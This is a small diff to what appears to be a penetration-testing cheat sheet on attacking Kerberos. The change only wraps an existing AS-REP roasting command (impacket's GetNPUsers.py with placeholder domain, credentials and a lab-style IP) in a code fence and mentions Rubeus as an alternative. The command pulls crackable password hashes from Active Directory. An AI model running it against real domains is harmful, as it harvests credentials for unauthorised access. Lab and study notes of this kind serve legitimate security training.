@@ -198,7 +198,9 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
       
    2. Use ASREP roast against users in the ldapenum_asrep_users.txt file
     
-	GetNPUsers.py xxx.com/xxx:xxx -usersfile usersall.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.11.1.xxx
+	```
+   GetNPUsers.py xxx.com/xxx:xxx -usersfile usersall.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.11.1.xxx
+   ```
 	
 	OR with Rubeus
 	
